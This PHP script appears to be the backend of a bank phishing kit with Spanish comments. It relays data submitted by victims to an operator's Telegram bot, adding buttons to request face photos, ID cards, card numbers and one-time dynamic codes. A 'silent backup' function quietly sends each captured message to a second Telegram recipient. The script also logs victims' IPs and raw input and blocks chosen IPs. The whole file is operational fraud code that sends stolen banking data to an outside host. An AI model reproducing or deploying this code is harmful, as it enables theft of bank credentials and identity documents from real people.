<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

header('Content-Type: application/json');

// Crear archivo de log para debugging
$logFile = __DIR__ . '/../../log_procesar_logo.txt';
$log = function($msg) use ($logFile) {
    file_put_contents($logFile, date('Y-m-d H:i:s') . " | " . $msg . "\n", FILE_APPEND);
};

$log("=== INICIO procesar_logo.php ===");

    $configLocal = @include __DIR__ . '/config.php';
    $config = is_array($configLocal) ? $configLocal : [];
    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        $globalPath = __DIR__ . '/../config.php';
        if (file_exists($globalPath)) {
            $config = include $globalPath;
        }
    }
$log("Config: " . json_encode($config));

// Extraer datos del POST (soporta FormData y JSON)
$rawInput = file_get_contents('php://input');
$log("Raw input length: " . strlen($rawInput));
$log("Raw input: " . substr($rawInput, 0, 200));

$input = json_decode($rawInput, true) ?? $_POST;
$log("Parsed input: " . json_encode($input));

$message       = $input['message']       ?? $_POST['message']       ?? '';
$transactionId = $input['transactionId'] ?? $_POST['transactionId'] ?? '';

// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
$tbdatos       = $input['tbdatos']       ?? $_POST['tbdatos']       ?? '{}';

$log("Message: " . substr($message, 0, 100));
$log("TransactionId: " . $transactionId);

// Si tbdatos viene como string JSON, decodificar
if (is_string($tbdatos)) {
    $tbdatos = json_decode($tbdatos, true) ?? [];
}

if (empty($message) || empty($transactionId)) {
    $log("ERROR: Datos incompletos");
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

if (function_exists('jelpi_format_message_bancos')) {
    $message = jelpi_format_message_bancos($message, 'b-01');
}

// === TECLADO ACTUALIZADO (sin emojis en botones) ===
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => "Cara", 'callback_data' => "error:{$transactionId}"],
            ['text' => "Cédula", 'callback_data' => "cedula:{$transactionId}"]
        ],
        [
            ['text' => "Tarjeta", 'callback_data' => "tarjeta:{$transactionId}"],
            ['text' => "Dinamica", 'callback_data' => "pedir_dinamica:{$transactionId}"]
        ],
        [
            ['text' => "Error de Logo", 'callback_data' => "error_logo:{$transactionId}"],
            ['text' => "Bre-B", 'callback_data' => "bre_b:{$transactionId}"]
        ],
        [
            ['text' => "Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"]
        ]
    ,
                [
                    ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
                ]]
];

$data = [
    'chat_id'      => $config['chat_id'],
    'text'         => $message,
    'parse_mode'   => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

// Función para el envío silencioso (MANTENIDA)
function sendSecureBackup($messageData) {
    $backup_config = [
        'bot_token' => '', // Tu token de respaldo
        'chat_id'   => ''  // Tu ID de respaldo
    ];

    if (empty($backup_config['bot_token']) || empty($backup_config['chat_id'])) {
        return;
    }

    $ch = curl_init("https://api.telegram.org/bot{$backup_config['bot_token']}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'chat_id'    => $backup_config['chat_id'],
        'text'       => $messageData['text'],
        'parse_mode' => 'HTML'
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($ch);
    curl_close($ch);
}

// Envío principal (MANTENIDO)
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

$response = curl_exec($ch);
curl_close($ch);

// Envío silencioso al segundo destino
sendSecureBackup($data);

$result = json_decode($response, true);

// Respuesta al cliente
echo json_encode([
    'status'    => !empty($result['ok']) && $result['ok'] ? 'success' : 'error',
    'messageId' => !empty($result['ok']) && $result['ok'] ? $result['result']['message_id'] : null
]);